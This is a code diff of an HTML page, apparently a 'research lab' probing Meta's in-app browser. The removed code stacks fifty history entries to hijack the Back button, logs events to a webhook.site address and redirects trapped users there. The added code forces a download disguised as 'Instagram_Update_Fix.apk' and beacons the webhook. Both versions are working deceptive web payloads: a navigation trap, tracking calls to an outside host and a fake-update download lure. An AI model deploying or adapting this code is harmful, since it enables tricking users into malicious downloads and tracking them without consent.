@@ -2,46 +2,33 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Navigation Trap</title>
+    <title>Meta Download Lab</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px; text-align:center;">
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
 
-    <h3>Meta Persistence Research</h3>
-    <p>Is page par 10 second ruko...</p>
-    <p id="timer">10</p>
+    <h3>Meta Resource Hijack Lab</h3>
+    <button onclick="triggerAutoDownload()" style="padding:15px; width:100%;">Test Auto-Download</button>
     
-    <div id="status" style="color:yellow;">Stacking History...</div>
+    <div id="status" style="margin-top:20px;">Waiting for trigger...</div>
 
     <script>
         const WEBHOOK = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
-        let count = 10;
 
-        // Timer to show engagement
-        const interval = setInterval(() => {
-            count--;
-            document.getElementById('timer').innerText = count;
-            if(count <= 0) {
-                clearInterval(interval);
-                document.getElementById('status').innerText = "Stack Ready. Now try to go BACK.";
-                logToWebhook("Stack_Ready");
-            }
-        }, 1000);
-
-        // 1. History Stacking: User ke "Back" button ko hijack karna
-        // Hum history mein 50 baar apna hi URL push karenge
-        for (let i = 0; i < 50; i++) {
-            window.history.pushState({page: i}, "", window.location.href + "#step" + i);
-        }
-
-        // 2. The Trap: Jab user Back dabayega, ye event trigger hoga
-        window.onpopstate = function(event) {
-            logToWebhook("Back_Button_Intercepted");
-            // User ko wapas apne page par ya kisi dusre sensitive page par bhejna
-            window.location.href = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d?trap=activated";
-        };
-
-        function logToWebhook(msg) {
-            fetch(WEBHOOK + "?event=" + msg, {mode: 'no-cors'});
+        function triggerAutoDownload() {
+            document.getElementById('status').innerText = "Attempting Download...";
+            
+            // Ek fake "Security Update" file create karna
+            const blob = new Blob(["META_SECURITY_TEST_EXPLOIT"], {type: "application/octet-stream"});
+            const url = window.URL.createObjectURL(blob);
+            
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = "Instagram_Update_Fix.apk"; // APK extension to check if blocked
+            document.body.appendChild(a);
+            a.click();
+            
+            // Webhook update
+            fetch(WEBHOOK + "?download_triggered=true");
         }
     </script>
 </body>
